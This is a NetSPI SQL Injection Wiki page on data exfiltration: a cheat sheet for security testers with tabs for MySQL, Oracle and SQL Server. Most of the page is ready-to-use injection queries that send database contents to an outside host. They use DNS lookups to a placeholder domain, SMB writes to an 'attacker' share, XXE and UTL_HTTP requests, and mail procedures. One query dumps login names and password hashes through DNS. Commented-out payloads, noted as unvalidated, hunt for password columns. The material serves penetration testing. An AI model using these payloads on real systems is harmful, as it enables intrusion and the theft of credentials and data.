<html>

<head>
  <meta charset="utf-8">
  <title>Data Exfiltration | NetSPI SQL Injection Wiki</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="../assets/scss/index.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../assets/scss/nav.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../assets/scss/tab.css%3F1571409135814090317.css" />
  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
  <script src="../assets/javascripts/cash.min.js"></script>
  <script type="text/javascript" async src="../assets/javascripts/index.js%3F1571409135814090317"></script>
  
  <script type="text/javascript" async src="../assets/javascripts/tab.js%3F1571409135814090317"></script>
  
  <meta name="theme-color" content="#ffffff">
  <meta property="og:type" content="website" />
  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
  <meta property="og:description" content="Exfiltrating data through SQL Injection allows easier data analysis, as well as an offline copy of any compromised data." />
  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
  <meta name="twitter:description" content="Exfiltrating data through SQL Injection allows easier data analysis, as well as an offline copy of any compromised data." />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
  <meta name="twitter:site" content="@netspi" />
  <meta name="twitter:creator" content="@netspi" />
  <meta name="description" content="Exfiltrating data through SQL Injection allows easier data analysis, as well as an offline copy of any compromised data.">
  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,data exfiltration, exfiltration, breach">
  <link rel="author" href="https://netspi.com" />
  <link rel="shortcut icon" href="../assets/images/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
</head>

<body class="preload">
  <div class="mobile"></div>
  <div id="contentWrapper">
    <div id="topBar">
      <div class="n-nav-icon default">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div id="logoContainer">
      <a href="https://netspi.com"><img src="../assets/images/logo.png%3F1571409135814090317" /></a><br/>
      </div>
    </div>
    <div class="n-navbar default">
      <ul>
  
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/" href="../index.html">
      
    <div>Home</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
    
    <div>About Us</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/detection" href="../detection.html">
      
    <div>Injection Detection</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/dbmsIdentification/" href="../dbmsIdentification/index.html">
      
    <div>DBMS Identification</div>
    </a>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTypes/" href="../injectionTypes/index.html">
          
          <div>Injection Types</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/errorBased/" href="../injectionTypes/errorBased/index.html">
          
          <div>Error Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/unionBased/" href="../injectionTypes/unionBased/index.html">
          
          <div>Union Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/blindBased/" href="../injectionTypes/blindBased/index.html">
          
          <div>Blind Based Injection</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTechniques/" href="../injectionTechniques/index.html">
          
          <div>Injection Techniques</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../injectionTechniques/conditionalStatements/index.html">
          
          <div>Conditional Statements</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../injectionTechniques/injectionPlacement/index.html">
          
          <div>Injection Placement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../injectionTechniques/obfuscation/index.html">
          
          <div>Injection Obfuscation</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/attackQueries/" href="index.html">
          
          <div>Attack Queries</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/informationGathering/" href="informationGathering/index.html">
          
          <div>Information Gathering</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataTargeting/" href="dataTargeting/index.html">
          
          <div>Data Targeting</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="privilegeEscalation/index.html">
          
          <div>Privilege Escalation</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/executingOSCommands/" href="executingOSCommands/index.html">
          
          <div>Executing OS Commands</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="readingAndWritingFiles/index.html">
          
          <div>Reading and Writing Files</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/lateralMovement/" href="lateralMovement/index.html">
          
          <div>Lateral Movement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataExfiltration/" href="dataExfiltration.html">
          
          <div>Data Exfiltration</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/persistence/" href="persistence/index.html">
          
          <div>Persistence</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
          <div>Misc.</div>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/contributors" href="../misc/contributors.html">
          
          <div>Contributors</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/references/" href="../misc/references/index.html">
          
          <div>References</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/sandboxes/" href="../misc/sandboxes/index.html">
          
          <div>Sandboxes</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/tools/" href="../misc/tools/index.html">
          
          <div>Tools</div>
        </a>
      </li>
      
    </ul>
  </li>
   
</ul>

    </div>
    <div id="contentContainer">
      <div id="tabs" class="tabs" data-tabs-ignore-url="false">

<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="data-exfiltration">Data Exfiltration</h3>


<p class="pageDescription">Exfiltrating data allows easier data analysis, as well as an offline copy of any compromised data.  Data can be exfiltrated through files, various Layer 4 requests, and hidden techniques.</p>

<p>* Requires privileged user</p>
<table class="table table-striped table-hover">
<thead>
<tr>
  <th>Description</th>
  <th align="left">Query</th>
</tr>
</thead>
<tbody><tr>
  <td>DNS Request</td>
  <td>SELECT LOAD_FILE(concat('\\\\',(<strong>QUERY_WITH_ONLY_ONE_ROW</strong>), '.yourhost.com\\'))</td>
</tr>
<tr>
  <td>SMB Share</td>
  <td>SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt'</td>
</tr>
<tr>
  <td>HTTP Server</td>
  <td>SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt'</td>
</tr>
<tr>
  <td>Numeric Concatenation</td>
  <td>SELECT length(user())<br>SELECT ASCII(substr(user(),1)) <br><br><em>When data can only be exported as numbers, convert to ASCII.  For automation see <a target="_blank" rel="noopener" href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1">here</a>.</em></td>
</tr>
</tbody></table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="data-exfiltration">Data Exfiltration</h3>


<p class="pageDescription">Exfiltrating data allows easier data analysis, as well as an offline copy of any compromised data.  Data can be exfiltrated through files, various Layer 4 requests, and hidden techniques.</p>

<p>* Requires privileged user</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Combine multiple lines into one</td>
      <td>SELECT dbms_xmlgen.getxmltype('select user from dual') FROM dual</td>
    </tr>
    <tr>
      <td>XML External Entity</td>
      <td>SELECT xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://IP/test"&gt; %remote; %param1;]&gt;') FROM dual;</td>
    </tr>
    <tr>
      <td>URL_HTTP Request (Pre-11gR2)</td>
      <td>SELECT UTL_HTTP.request ('http://IP/test') FROM dual;</td>
    </tr>
    <tr>
      <td>Escaping special characters</td>
      <td>SELECT UTL_URL.escape('http://IP/' || USER) FROM dual;</td>
    </tr>
  </tbody>
</table>
<!-- TODO: validate these queries -->
<!-- '||dbms_xmlgen.getxml('select+rtrim(xmlagg(xmlelement(e,owner||''.''||table_name||'','')).extract(''//text()''),'','')+a+from+all_tab_columns+where+column_name+like+''%25PASS%25''+and+OWNER+not+like+''SYS%25''')+from+dual||'
'||CTXSYS.DRITHSX.SN(user,to_char(dbms_xmlgen.getxml('SELECT+*from(select+banner,rownum+r+from+v$version)a+where+r+between+0+and+10'))+from+dual)--||'
'||CTXSYS.DRITHSX.SN(rtrim(dbms_xmlgen.getxml('SELECT+*from(select+banner,rownum+r+from+v$version)a+where+r+between+0+and+10'))+from+dual--
'||dbms_xmlquery.getxml('select+rtrim(xmlagg(xmlelement(e,table_name||'','')).extract(''//text()''),'','')+a+from all_tab_columns+where+column_name+like+''%PASS%'' and+OWNER+not+like+''SYS%''') -->

</div>

<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="data-exfiltration">Data Exfiltration</h3>

<p class="pageDescription">Exfiltrating data allows easier data analysis, as well as an offline copy of any compromised data.  Data can be exfiltrated through files, various Layer 4 requests, and hidden techniques.</p>

<p><i>Note: It is possible to make a DNS request from MSSQL. However, this request requires administrator privileges and SQL Server 2005.</i></p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Make DNS Request</td>
      <td>DECLARE @host varchar(800);<br>select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.netspi.com' from sys.sql_logins;<br>exec('xp_fileexist "\' + @host + 'c$boot.ini"');</td>
    </tr>
    <tr>
      <td>UNC Path (DNS Request)</td>
      <td>
		xp_dirtree '\\data.domain.com\file' <br>		
		The UNC Path Injection Cheatsheet can be found <a href="https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet">here</a>.
		</td>
    </tr>
    <tr>
      <td>Enable sp_send_dbmail and send query</td>
      <td>sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version';</td>
    </tr>
    <tr>
      <td>Basic xp_sendmail Query</td>
      <td>EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.'</td>
    </tr>
    <tr>
      <td>Send Full Email with xp_sendmail</td>
      <td>EXEC xp_sendmail @recipients='harold@netspi.com',<br>@message='This is a test.',<br>@copy_recipients='test@netspi.com',<br>@subject='TEST'</td>
    </tr>
    <tr>
      <td>Send Query Results Via xp_sendmail</td>
      <td>EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version';</td>
    </tr>
    <tr>
      <td>Send Query Results as Attachment Via xp_sendmail</td>
      <td>CREATE TABLE ##texttab (c1 text)<br>INSERT ##texttab values ('Put messge here.')<br>DECLARE @cmd varchar(56)<br>SET @cmd = 'SELECT c1 from ##texttab'<br>EXEC master.dbo.xp_sendmail 'robertk',<br>@query = @cmd, @no_header='TRUE'<br>DROP TABLE ##texttab</td>
    </tr>
  </tbody>
</table>

</div>

</div>

      <div><div>
  <br/>
  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
</div>
</div>
    </div>
  </div>
</body>
</html>
